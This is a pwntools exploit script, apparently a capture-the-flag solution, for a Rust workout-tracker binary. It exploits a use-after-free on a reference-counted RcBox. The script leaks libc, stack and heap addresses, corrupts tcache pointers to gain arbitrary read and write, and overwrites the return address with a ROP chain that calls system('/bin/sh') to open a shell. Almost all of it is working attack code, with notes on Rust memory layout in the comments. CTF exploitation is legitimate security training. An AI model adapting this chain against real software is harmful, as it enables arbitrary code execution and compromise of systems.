#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 127.0.0.1 --port 4000

# dont forget to: patchelf --set-interpreter /tmp/ld-2.27.so ./test
# dont forget to set conext.arch. E.g amd64

from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './chall_patched'
#exe = './chall_me_release'
#exe = './chall_me'
#exe = './chall'
#context.terminal = ['tmux', 'new-window']
context.terminal = ["tmux", "splitw", "-hb"]
argv = []
env = {}
libc = ELF('./libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 4000)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

def add_exercise(name, desc):
    io.sendlineafter("option:", str(1))
    io.sendlineafter("name", name)
    io.sendlineafter("description", desc)

# data = [[name, amt]]
def add_workout(amt, data):
    io.sendlineafter("option:", str(2))
    io.sendlineafter("your workout have", str(amt))
    for i in range(amt):
        io.sendlineafter("name", data[i][0])
        if data[i][0] != "I":
            io.sendlineafter("be repeated", str(data[i][1]))

def view_workout(idx):
    io.sendlineafter("option:", str(3))
    io.sendlineafter("id of your", str(idx))

def edit_exercise(name, data):
    io.sendlineafter("option:", str(4))
    io.sendlineafter("want to edit", name)
    io.sendlineafter("new description:", data)

def do_crash():
    global io
    io.recvuntil("an option:")
    data = open("test2", "rb").read()
    data = data.split(b"\n")
    for x in data:
        x= x.replace(b"\t", b"")
        #print(x)
        if b"4" in x:
            print("EDIT")
        io.sendline(x)
    io.interactive()

# # p = ptr , l = addr of ptr
def mask(p, l):
    return p ^ (l >> 12) 

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
# pwndbg tele command
gdbscript = '''
breakrva 0x273b8
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

#add 1 exercise
# workout 2 exercises, only first valid
# add 2nd exercise
# add 3nd exercise

# index not checked when workout is accessed


'''
24 bytes by default
vec layout:
    - ptr
    - capacity
    - (allocator - only important if state)
    - length

in memory layout:
    - length
    - ptr
    - capacity
'''
# bug: i am able to increase the refcount
# pointer of a freed RcBox

# overwrite freed RcBox of initial exercise A with
# RepeatN vector
#
#add_workout(2, [["A", 0x8], ["A", 0x10]])

io = start(argv, env=env)

add_exercise("A", "I"*0x20)
add_workout(1, [["A", 0]])

# Free the initial exercise A structs
add_exercise("A", "D"*0x20)

add_workout(1, [["A", 1]])

# fill tcache to get a chunk into unsorted bin
for i in range(0x8):
    add_exercise(str(i)*8, p8(0x41+i)*0x80)

for i in range(0x8):
    add_exercise(str(i)*8, p8(0x41+i)*0x20)

# increase RcBox ptr of RepeatN to point to
# freed RcBox with description in unsorted bin
for i in range(0x8c0):
    view_workout(0)

view_workout(1)

io.recvuntil("- [")
leak = io.recvline().split(b',')
libc_leak = 0
for i in range(8):
    libc_leak |= int(leak[i], 10) << (i*8)

libc.address = libc_leak - 0x203b20
log.info(f"Libc base: {hex(libc.address)}")
log.info (f"Environ: {hex(libc.sym['environ'])}")

# overwrite freed RcBox and fake data
payload = p64(1)*2
payload += p64(0x10)
payload += p64(libc.sym['environ'])
payload += p64(0x10)
payload += p64(0x10)
payload += p64(libc.sym['main_arena']+0x60)
payload += p64(0x10)

add_exercise(b"F", payload)
#add_exercise("F"*0x10, b"D")

view_workout(1)
io.recvuntil(b"[")
leak = io.recvuntil("- [").split(b",")
stack_leak = 0
for i in range(8):
    stack_leak |= int(leak[i], 10) << (i*8)

log.info(f"Stack leak: {hex(stack_leak)}")

leak = io.recvline().split(b',')
heap_leak = 0
for i in range(8):
    heap_leak |= int(leak[i], 10) << (i*8)

heap_leak -= 0x3a90

log.info(f"Heap base: {hex(heap_leak)}")

# having all the leaks, lets corrupt the heap to get a description vector pointing to an inuse 
# RcBox such that we get arb read and write

add_exercise(b"victim", b"A"*0x100)

victim_addr = heap_leak + 0x3bb0
addr_of_fd_ptr = heap_leak + 0x3c90

log.info(f"Address of victim: {hex(victim_addr)}")

cur_fd_ptr = heap_leak + 0x3c20

cur_enc_fd_ptr = mask(cur_fd_ptr, addr_of_fd_ptr)

log.info(f"Current enc fd ptr: {hex(cur_enc_fd_ptr)}")

new_enc_fd_ptr = mask(victim_addr, addr_of_fd_ptr)

to_add = new_enc_fd_ptr - cur_enc_fd_ptr

if to_add < 0:
    print("Unable to corrupt tcache")
    exit(0)

#gdb.attach(io, gdbscript)

# 0x50 bin
add_exercise("A", "I"*0x40)
# 2
add_workout(1, [["A", 0]])
# free initial exercise A
add_exercise("A", "D"*0x20)

# increase refcounter of freed rcbox to corrupt tcache fd ptr
for i in range(to_add):
    view_workout(2)

# address of W*0x40 key
key_chunk = heap_leak + 0x3c90

# this exercises description pointer will overlap with RcBox of victim
# => we have arb read write because we can repeatedly fake the RcBox now
work_out_repeat_n_vec = heap_leak + 0x2f00
payload = p64(1)*2
payload += p64(0x10)
payload += p64(libc.sym['environ'])
payload += p64(0x10)
payload += p64(0x70)
payload += p64(work_out_repeat_n_vec)
payload += p64(0x70)

add_exercise(b"W"*0x40, payload)

# write all zeros to the Vec<RepeatN<Rc<Exercise>>>, such that nothing is tried to be freed
edit_exercise(b"victim", p8(0)*0x70)

# -0x40 just to be sure it also works with a different stack layout
ret_addr = stack_leak - 0x320 - 0x40
payload = p64(1)*2
payload += p64(0x10)
payload += p64(libc.sym['environ'])
payload += p64(0x10)
payload += p64(0x100)
payload += p64(ret_addr)
payload += p64(0x100)
edit_exercise(b"W"*0x40, payload)

rop = ROP(libc)
pop_rdi = rop.rdi.address
ret = rop.ret.address

payload = p64(ret)*10
payload += p64(pop_rdi)
payload += p64(next(libc.search("/bin/sh\x00")))
payload += p64(ret)
payload += p64(libc.sym['system'])
payload += ((0x100 - len(payload))//8) * p64(ret)
edit_exercise(b"victim", payload)

io.sendlineafter("option:", "5")

io.interactive()

'''
pub union MaybeUninit<T> {
    uninit: (),
    value: ManuallyDrop<T>,
}
=> Owns val = same size as T

pub struct RepeatN<A> {
    count: usize,
    element: ManuallyDrop<A>,
}

pub struct ManuallyDrop<T: ?Sized> {
    value: T,
}

=> 8 + size of A (since ManuallyDrop owns val)
=> RepeatN<Rc> => 8 +8 = 16 bytes

pub struct Rc<
    T: ?Sized,
    #[unstable(feature = "allocator_api", issue = "32838")] A: Allocator = Global,
> {
    ptr: NonNull<RcBox<T>>,
    phantom: PhantomData<RcBox<T>>,
    alloc: A, = Global in default case = 0 size add
}
=> Rc normally size of 8 bytes (just the ptr to RcBox)

struct RcBox<T: ?Sized> {
    strong: Cell<usize>,
    weak: Cell<usize>,
    value: T,
}

pub struct Cell<T: ?Sized> {
    value: UnsafeCell<T>,
}

pub struct UnsafeCell<T: ?Sized> {
    value: T,
}

=> RcBox = 16 bytes + size of value


std::iter::repeat_n(
    Rc::clone(exercise),
    num_repetitions as usize,
)


bug: probably RcBox UAF

'''

